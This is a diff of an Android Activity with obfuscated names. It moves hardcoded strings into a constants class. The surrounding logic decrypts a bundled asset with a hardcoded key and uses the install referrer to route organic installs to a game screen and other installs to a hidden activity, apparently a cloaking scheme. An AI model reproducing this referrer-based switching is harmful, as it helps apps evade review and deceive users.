@@ -66,11 +66,10 @@ public class d08a3hqr extends Activity {
         findViewById(R.id.tvw7).setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Init.assetsName = "a";
-                FileUtils.decryptFile(context, Init.assetsName, "abcdefghijklmnop");
+                StartConstant.assetsName = "a";
+                FileUtils.decryptFile(context, StartConstant.assetsName, "abcdefghijklmnop");
             }
         });
-
     }
 
     private void aabInstall() {
@@ -89,7 +88,7 @@ public class d08a3hqr extends Activity {
                         if (TextUtils.isEmpty(referrerUrl)) {
                             loadA();
                         } else {
-                            if (referrerUrl.contains("utm_medium=organic")) {
+                            if (referrerUrl.contains(StartConstant.referrer_Url_utm_medium_organic)) {
                                 loadA();
                             } else {
                                 //非自然
@@ -125,7 +124,7 @@ public class d08a3hqr extends Activity {
             public void run() {
                 Init.init(context, "abcdefghijklmnop", "a", isDebug());
                 Intent intent = new Intent();
-                intent.setClassName(getPackageName(), "com.cocos.game.AppActivity");
+                intent.setClassName(getPackageName(), StartConstant.a_main_Activity);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 finish();
                 startActivity(intent);
@@ -139,7 +138,7 @@ public class d08a3hqr extends Activity {
             public void run() {
                 Init.init(context, "abcdefghijklmnop", "b", isDebug());
                 Intent intent = new Intent();
-                intent.setClassName(getPackageName(), "com.d08a3hqr.chtjikfd.CkiOFmJI");
+                intent.setClassName(getPackageName(), StartConstant.b_main_Activity);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 finish();
                 startActivity(intent);
